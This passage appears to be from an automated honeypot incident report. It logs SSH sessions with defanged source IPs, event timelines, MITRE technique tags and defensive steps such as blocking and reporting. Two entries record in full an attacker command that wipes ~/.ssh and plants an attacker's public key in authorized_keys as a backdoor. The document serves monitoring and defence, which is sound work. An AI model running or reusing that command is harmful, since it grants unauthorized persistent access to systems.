| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 01:13:27` | `cowrie.session.connect` |
| `2026-07-17 01:13:28` | `cowrie.client.version` |
| `2026-07-17 01:13:28` | `cowrie.client.kex` |
| `2026-07-17 01:13:30` | `cowrie.login.success` |
| `2026-07-17 01:13:31` | `cowrie.direct-tcpip.request` |
| `2026-07-17 01:13:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.178.185[.]141` to AbuseIPDB if not already reported
- [ ] Block `121.178.185[.]141` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f40a79a35db

| Field | Detail |
|---|---|
| **Source IP** | `41.220.3[.]101` |
| **First Seen** | 2026-07-17 01:13 |
| **Last Seen** | 2026-07-17 01:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 01:13:41` | `cowrie.session.connect` |
| `2026-07-17 01:13:42` | `cowrie.client.version` |
| `2026-07-17 01:13:42` | `cowrie.client.kex` |
| `2026-07-17 01:13:43` | `cowrie.login.success` |
| `2026-07-17 01:13:44` | `cowrie.direct-tcpip.request` |
| `2026-07-17 01:13:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.220.3[.]101` to AbuseIPDB if not already reported
- [ ] Block `41.220.3[.]101` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a39910708173

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-17 01:20 |
| **Last Seen** | 2026-07-17 01:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 01:20:16` | `cowrie.session.connect` |
| `2026-07-17 01:20:16` | `cowrie.client.version` |
| `2026-07-17 01:20:16` | `cowrie.client.kex` |
| `2026-07-17 01:20:16` | `cowrie.login.success` |
| `2026-07-17 01:20:17` | `cowrie.session.params` |
| `2026-07-17 01:20:17` | `cowrie.command.input` |
| `2026-07-17 01:20:17` | `cowrie.log.closed` |
| `2026-07-17 01:20:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a46a3026c532

| Field | Detail |
|---|---|
| **Source IP** | `122.170.97[.]94` |
| **First Seen** | 2026-07-17 01:27 |
| **Last Seen** | 2026-07-17 01:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 01:27:49` | `cowrie.session.connect` |
| `2026-07-17 01:27:50` | `cowrie.client.version` |
| `2026-07-17 01:27:50` | `cowrie.client.kex` |
| `2026-07-17 01:27:51` | `cowrie.login.success` |
| `2026-07-17 01:27:52` | `cowrie.direct-tcpip.request` |
| `2026-07-17 01:27:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.97[.]94` to AbuseIPDB if not already reported
- [ ] Block `122.170.97[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c32609a43e0d

| Field | Detail |
|---|---|
| **Source IP** | `222.99.52[.]202` |
| **First Seen** | 2026-07-17 01:27 |
| **Last Seen** | 2026-07-17 01:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 01:27:57` | `cowrie.session.connect` |
| `2026-07-17 01:27:58` | `cowrie.client.version` |
| `2026-07-17 01:27:58` | `cowrie.client.kex` |
| `2026-07-17 01:28:00` | `cowrie.login.success` |
| `2026-07-17 01:28:01` | `cowrie.direct-tcpip.request` |
| `2026-07-17 01:28:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.99.52[.]202` to AbuseIPDB if not already reported
- [ ] Block `222.99.52[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f13d324a8420

| Field | Detail |
|---|---|
| **Source IP** | `65.20.237[.]191` |
| **First Seen** | 2026-07-17 01:31 |
| **Last Seen** | 2026-07-17 01:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 01:31:12` | `cowrie.session.connect` |
| `2026-07-17 01:31:13` | `cowrie.client.version` |
| `2026-07-17 01:31:13` | `cowrie.client.kex` |
| `2026-07-17 01:31:14` | `cowrie.login.success` |
| `2026-07-17 01:31:15` | `cowrie.direct-tcpip.request` |
| `2026-07-17 01:31:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `65.20.237[.]191` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d94b251ef3a2

| Field | Detail |
|---|---|
| **Source IP** | `113.158.205[.]225` |
| **First Seen** | 2026-07-17 01:31 |
| **Last Seen** | 2026-07-17 01:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 01:31:20` | `cowrie.session.connect` |
| `2026-07-17 01:31:20` | `cowrie.client.version` |
| `2026-07-17 01:31:20` | `cowrie.client.kex` |
| `2026-07-17 01:31:22` | `cowrie.login.success` |
| `2026-07-17 01:31:23` | `cowrie.direct-tcpip.request` |
| `2026-07-17 01:31:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.158.205[.]225` to AbuseIPDB if not already reported
- [ ] Block `113.158.205[.]225` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d49b8da14a8

| Field | Detail |
|---|---|
| **Source IP** | `103.172.236[.]241` |
| **First Seen** | 2026-07-17 01:31 |
| **Last Seen** | 2026-07-17 01:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 01:31:59` | `cowrie.session.connect` |
| `2026-07-17 01:31:59` | `cowrie.client.version` |
| `2026-07-17 01:32:00` | `cowrie.client.kex` |
| `2026-07-17 01:32:01` | `cowrie.login.success` |
| `2026-07-17 01:32:02` | `cowrie.session.params` |
| `2026-07-17 01:32:02` | `cowrie.command.input` |
| `2026-07-17 01:32:02` | `cowrie.command.failed` |
| `2026-07-17 01:32:03` | `cowrie.log.closed` |
| `2026-07-17 01:32:04` | `cowrie.session.params` |
| `2026-07-17 01:32:04` | `cowrie.command.input` |
| `2026-07-17 01:32:04` | `cowrie.session.file_download` |
| `2026-07-17 01:32:04` | `cowrie.log.closed` |
| `2026-07-17 01:32:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.236[.]241` to AbuseIPDB if not already reported
- [ ] Block `103.172.236[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33551656097f

| Field | Detail |
|---|---|
| **Source IP** | `103.172.236[.]241` |
| **First Seen** | 2026-07-17 01:32 |
| **Last Seen** | 2026-07-17 01:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 01:32:04` | `cowrie.session.connect` |
| `2026-07-17 01:32:04` | `cowrie.client.version` |
| `2026-07-17 01:32:04` | `cowrie.client.kex` |
| `2026-07-17 01:32:05` | `cowrie.login.success` |
| `2026-07-17 01:32:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.236[.]241` to AbuseIPDB if not already reported
- [ ] Block `103.172.236[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61ea87bc9094

| Field | Detail |
|---|---|
| **Source IP** | `103.172.236[.]241` |
| **First Seen** | 2026-07-17 01:32 |
| **Last Seen** | 2026-07-17 01:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 01:32:06` | `cowrie.session.connect` |
| `2026-07-17 01:32:06` | `cowrie.client.version` |
| `2026-07-17 01:32:06` | `cowrie.client.kex` |
| `2026-07-17 01:32:07` | `cowrie.login.success` |
| `2026-07-17 01:32:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.236[.]241` to AbuseIPDB if not already reported
- [ ] Block `103.172.236[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cba920cf84f0

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-17 01:36 |
| **Last Seen** | 2026-07-17 01:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 01:36:09` | `cowrie.session.connect` |
| `2026-07-17 01:36:09` | `cowrie.client.version` |
| `2026-07-17 01:36:09` | `cowrie.client.kex` |
| `2026-07-17 01:36:10` | `cowrie.login.success` |
| `2026-07-17 01:36:10` | `cowrie.direct-tcpip.request` |
| `2026-07-17 01:36:10` | `cowrie.direct-tcpip.data` |
| `2026-07-17 01:36:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddaf6f84742e

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-17 01:37 |
| **Last Seen** | 2026-07-17 01:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 01:37:19` | `cowrie.session.connect` |
| `2026-07-17 01:37:19` | `cowrie.client.version` |
| `2026-07-17 01:37:19` | `cowrie.client.kex` |
| `2026-07-17 01:37:19` | `cowrie.login.success` |
| `2026-07-17 01:37:20` | `cowrie.session.params` |
| `2026-07-17 01:37:20` | `cowrie.command.input` |
| `2026-07-17 01:37:20` | `cowrie.log.closed` |
| `2026-07-17 01:37:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0696b5b6bc62

| Field | Detail |
|---|---|
| **Source IP** | `103.61.122[.]229` |
| **First Seen** | 2026-07-17 01:45 |
| **Last Seen** | 2026-07-17 01:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 01:45:15` | `cowrie.session.connect` |
| `2026-07-17 01:45:15` | `cowrie.client.version` |
| `2026-07-17 01:45:15` | `cowrie.client.kex` |
| `2026-07-17 01:45:16` | `cowrie.login.success` |
| `2026-07-17 01:45:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.122[.]229` to AbuseIPDB if not already reported
- [ ] Block `103.61.122[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72a202f9e698

| Field | Detail |
|---|---|
| **Source IP** | `182.75.227[.]178` |
| **First Seen** | 2026-07-17 01:52 |
| **Last Seen** | 2026-07-17 01:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 01:52:36` | `cowrie.session.connect` |
| `2026-07-17 01:52:37` | `cowrie.client.version` |
| `2026-07-17 01:52:37` | `cowrie.client.kex` |
| `2026-07-17 01:52:39` | `cowrie.login.success` |
| `2026-07-17 01:52:40` | `cowrie.direct-tcpip.request` |
| `2026-07-17 01:52:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.227[.]178` to AbuseIPDB if not already reported
- [ ] Block `182.75.227[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9165882a67e

| Field | Detail |
|---|---|
| **Source IP** | `200.159.14[.]187` |
| **First Seen** | 2026-07-17 01:52 |
| **Last Seen** | 2026-07-17 01:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 01:52:45` | `cowrie.session.connect` |
| `2026-07-17 01:52:46` | `cowrie.client.version` |
| `2026-07-17 01:52:46` | `cowrie.client.kex` |
| `2026-07-17 01:52:47` | `cowrie.login.success` |
| `2026-07-17 01:52:48` | `cowrie.direct-tcpip.request` |
| `2026-07-17 01:52:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.159.14[.]187` to AbuseIPDB if not already reported
- [ ] Block `200.159.14[.]187` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a5c93d2188f

| Field | Detail |
|---|---|
| **Source IP** | `78.187.9[.]111` |
| **First Seen** | 2026-07-17 01:59 |
| **Last Seen** | 2026-07-17 01:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 01:59:33` | `cowrie.session.connect` |
| `2026-07-17 01:59:33` | `cowrie.client.version` |
| `2026-07-17 01:59:33` | `cowrie.client.kex` |
| `2026-07-17 01:59:35` | `cowrie.login.success` |
| `2026-07-17 01:59:35` | `cowrie.direct-tcpip.request` |
| `2026-07-17 01:59:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.187.9[.]111` to AbuseIPDB if not already reported
- [ ] Block `78.187.9[.]111` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94f3ade44278

| Field | Detail |
|---|---|
| **Source IP** | `181.233.140[.]250` |
| **First Seen** | 2026-07-17 01:59 |
| **Last Seen** | 2026-07-17 01:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 01:59:40` | `cowrie.session.connect` |
| `2026-07-17 01:59:40` | `cowrie.client.version` |
| `2026-07-17 01:59:40` | `cowrie.client.kex` |
| `2026-07-17 01:59:42` | `cowrie.login.success` |
| `2026-07-17 01:59:43` | `cowrie.direct-tcpip.request` |
| `2026-07-17 01:59:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.233.140[.]250` to AbuseIPDB if not already reported
- [ ] Block `181.233.140[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d79524e3559

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-17 02:03 |
| **Last Seen** | 2026-07-17 02:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 02:03:23` | `cowrie.session.connect` |
| `2026-07-17 02:03:23` | `cowrie.client.version` |
| `2026-07-17 02:03:23` | `cowrie.client.kex` |
| `2026-07-17 02:03:23` | `cowrie.login.success` |
| `2026-07-17 02:03:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce81839b1ae1

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-17 02:03 |
| **Last Seen** | 2026-07-17 02:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 02:03:24` | `cowrie.session.connect` |
| `2026-07-17 02:03:24` | `cowrie.client.version` |
| `2026-07-17 02:03:24` | `cowrie.client.kex` |
| `2026-07-17 02:03:24` | `cowrie.login.success` |
| `2026-07-17 02:03:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c7b1fd353c9

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-17 02:03 |
| **Last Seen** | 2026-07-17 02:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 02:03:33` | `cowrie.session.connect` |
| `2026-07-17 02:03:33` | `cowrie.client.version` |
| `2026-07-17 02:03:33` | `cowrie.client.kex` |
| `2026-07-17 02:03:33` | `cowrie.login.success` |
| `2026-07-17 02:03:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c2a8b6c0f59

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-17 02:03 |
| **Last Seen** | 2026-07-17 02:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 02:03:33` | `cowrie.session.connect` |
| `2026-07-17 02:03:33` | `cowrie.client.version` |
| `2026-07-17 02:03:33` | `cowrie.client.kex` |
| `2026-07-17 02:03:33` | `cowrie.login.success` |
| `2026-07-17 02:03:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-042aa19fd995

| Field | Detail |
|---|---|
| **Source IP** | `85.159.164[.]28` |
| **First Seen** | 2026-07-17 02:10 |
| **Last Seen** | 2026-07-17 02:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 02:10:59` | `cowrie.session.connect` |
| `2026-07-17 02:10:59` | `cowrie.client.version` |
| `2026-07-17 02:10:59` | `cowrie.client.kex` |
| `2026-07-17 02:11:01` | `cowrie.login.success` |
| `2026-07-17 02:11:01` | `cowrie.direct-tcpip.request` |
| `2026-07-17 02:11:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.159.164[.]28` to AbuseIPDB if not already reported
- [ ] Block `85.159.164[.]28` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aed66a405eee

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-17 02:12 |
| **Last Seen** | 2026-07-17 02:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 02:12:53` | `cowrie.session.connect` |
| `2026-07-17 02:12:53` | `cowrie.client.version` |
| `2026-07-17 02:12:53` | `cowrie.client.kex` |
| `2026-07-17 02:12:54` | `cowrie.login.success` |
| `2026-07-17 02:12:54` | `cowrie.session.params` |
| `2026-07-17 02:12:54` | `cowrie.command.input` |
| `2026-07-17 02:12:54` | `cowrie.log.closed` |
| `2026-07-17 02:12:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4900c3a0ba78

| Field | Detail |
|---|---|
| **Source IP** | `156.238.86[.]2` |
| **First Seen** | 2026-07-17 02:20 |
| **Last Seen** | 2026-07-17 02:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 02:20:38` | `cowrie.session.connect` |
| `2026-07-17 02:20:39` | `cowrie.client.version` |
| `2026-07-17 02:20:39` | `cowrie.client.kex` |
| `2026-07-17 02:20:40` | `cowrie.login.success` |
| `2026-07-17 02:20:40` | `cowrie.direct-tcpip.request` |
| `2026-07-17 02:20:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.238.86[.]2` to AbuseIPDB if not already reported
- [ ] Block `156.238.86[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd0fcf57abf7

| Field | Detail |
|---|---|
| **Source IP** | `113.200.216[.]246` |
| **First Seen** | 2026-07-17 02:20 |
| **Last Seen** | 2026-07-17 02:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 02:20:46` | `cowrie.session.connect` |
| `2026-07-17 02:20:46` | `cowrie.client.version` |
| `2026-07-17 02:20:46` | `cowrie.client.kex` |
| `2026-07-17 02:20:48` | `cowrie.login.success` |
| `2026-07-17 02:20:49` | `cowrie.direct-tcpip.request` |
| `2026-07-17 02:20:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.200.216[.]246` to AbuseIPDB if not already reported
- [ ] Block `113.200.216[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdd951542ae6

| Field | Detail |
|---|---|
| **Source IP** | `173.44.224[.]54` |
| **First Seen** | 2026-07-17 02:22 |
| **Last Seen** | 2026-07-17 02:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
